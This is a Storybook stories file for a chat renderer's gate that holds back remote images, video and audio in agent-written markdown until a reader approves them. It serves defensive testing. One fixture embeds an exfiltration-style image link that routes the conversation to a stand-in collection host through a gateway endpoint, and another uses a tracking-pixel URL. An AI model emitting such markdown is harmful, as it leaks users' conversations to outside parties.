import type { Meta, StoryObj } from '@storybook/react-vite'
import MarkdownRenderer from '../components/MarkdownRenderer'

/**
 * The gate that keeps agent-written markdown from fetching remote media on mount.
 *
 * Every state here is reachable from the renderer alone: the chip is what the
 * reader sees before approving, and the approved state is what one click leaves
 * behind. The approved stories are captured by clicking the chip, so the mounted
 * element and its provenance caption are the real ones rather than a mock-up.
 */
const meta = {
  title: 'Chat/RemoteMediaGate',
  component: MarkdownRenderer,
  parameters: { layout: 'padded' },
} satisfies Meta<typeof MarkdownRenderer>

export default meta
type Story = StoryObj<typeof meta>

/** An image the message describes, so the chip can quote that description. */
export const Image: Story = {
  args: {
    content: '<img src="https://metrics.example.com/weekly.png" alt="Weekly traffic chart">',
  },
}

/** No description in the message: the description line is absent, not empty. */
export const ImageWithoutDescription: Story = {
  args: { content: '<img src="https://tracker.example.net/pixel.png">' },
}

/**
 * A video whose poster lives on a SECOND host. Both hosts are disclosed, because
 * one click fetches from both and approving what is shown has to mean approving
 * everything that is fetched.
 */
export const VideoAcrossTwoHosts: Story = {
  args: {
    content:
      '<video controls src="https://cdn-a.example.com/walkthrough.mp4"'
      + ' poster="https://cdn-b.example.com/poster.png"></video>',
  },
}

/** Audio: same gate, its own icon and label. */
export const Audio: Story = {
  args: { content: '<audio controls src="https://media.example.org/briefing.mp3"></audio>' },
}

/** Already on this machine, so there is nothing to approve and no chip. */
export const LocalImageNeedsNoClick: Story = {
  args: { content: '![A chart already on this machine](/tmp/local-chart.png)' },
}

/**
 * A same-origin gateway route: the server would fetch some other host, so the
 * chip could only name the dashboard itself. Refused, with no button.
 */
export const GatewayRouteRefused: Story = {
  args: { content: '![Preview](/api/link-meta?url=https://collect.example.net/?d=conversation)' },
}

/**
 * Every gated form in one frame, which is how a reader meets them: several chips
 * in one answer, each naming its own host, beside a local image that loads.
 */
export const AllGated: Story = {
  args: { content: '' },
  render: () => (
    <div className="flex flex-col gap-6">
      {[
        ['Remote image, described in the message', Image.args],
        ['Remote image with no description', ImageWithoutDescription.args],
        ['Video whose poster is on a second host', VideoAcrossTwoHosts.args],
        ['Remote audio', Audio.args],
        ['Local image — no chip', LocalImageNeedsNoClick.args],
        ['Gateway route — refused, no button', GatewayRouteRefused.args],
      ].map(([label, args]) => (
        <div key={label as string} className="flex flex-col gap-1.5">
          <span className="text-[11px] uppercase tracking-wide text-muted">{label as string}</span>
          <div className="rounded-md border border-border p-3">
            <MarkdownRenderer {...(args as { content: string })} />
          </div>
        </div>
      ))}
    </div>
  ),
}
